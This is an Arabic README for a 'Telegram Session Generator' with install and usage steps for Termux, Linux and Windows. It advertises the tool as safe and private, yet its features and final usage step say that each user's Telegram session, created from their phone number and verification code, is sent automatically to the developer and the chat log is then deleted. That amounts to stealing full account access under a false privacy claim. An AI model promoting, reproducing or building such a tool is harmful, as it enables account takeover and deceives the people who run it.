3. README.md

```markdown
# 🔐 Telegram Session Generator

أداة آمنة لاستخراج جلسات التليجرام دون حفظ أي بيانات محلياً.

## ✨ المميزات
- ✅ لا يحفظ أي ملفات على الجهاز
- ✅ يرسل الجلسة مباشرة للمطور
- ✅ يحذف سجل المحادثة تلقائياً
- ✅ يعمل على جميع الأنظمة
- ✅ سريع وخفيف الوزن

## 📦 التثبيت السريع

### على Termux:
```bash
# تحديث النظام
pkg update && pkg upgrade -y

# تثبيت بايثون والمكتبات
pkg install python python-pip git -y

# تثبيت المشروع
git clone https://github.com/yourusername/telethon-session
cd telethon-session

# تثبيت المتطلبات
pip install -r requirements.txt

# تشغيل الأداة
python main.py
```

على Linux:

```bash
sudo apt update
sudo apt install python3 python3-pip git -y
git clone https://github.com/yourusername/telethon-session
cd telethon-session
pip3 install -r requirements.txt
python3 main.py
```

على Windows:

```bash
# تثبيت Python من python.org أولاً
git clone https://github.com/yourusername/telethon-session
cd telethon-session
pip install -r requirements.txt
python main.py
```

🚀 الاستخدام

1. قم بتشغيل الأداة:

```bash
python main.py
```

1. أدخل الـ API_ID و API_HASH (احصل عليهما من my.telegram.org)
2. أدخل رقم هاتفك مع المفتاح الدولي
3. أدخل كود التحقق الذي يصل على تيليجرام
4. يتم إرسال الجلسة للمطور تلقائياً وحذف المحادثة

🔒 الخصوصية والأمان

· ⚠️ لا يتم حفظ أي بيانات على جهازك
· 🗑️ يتم حذف سجل المحادثة تلقائياً
· 🔐 الجلسة ترسل للمطور فقط عبر تيليجرام
· 🧹 يتم تنظيف الذاكرة بعد الانتهاء

📞 الدعم

المطور: @uuf3f
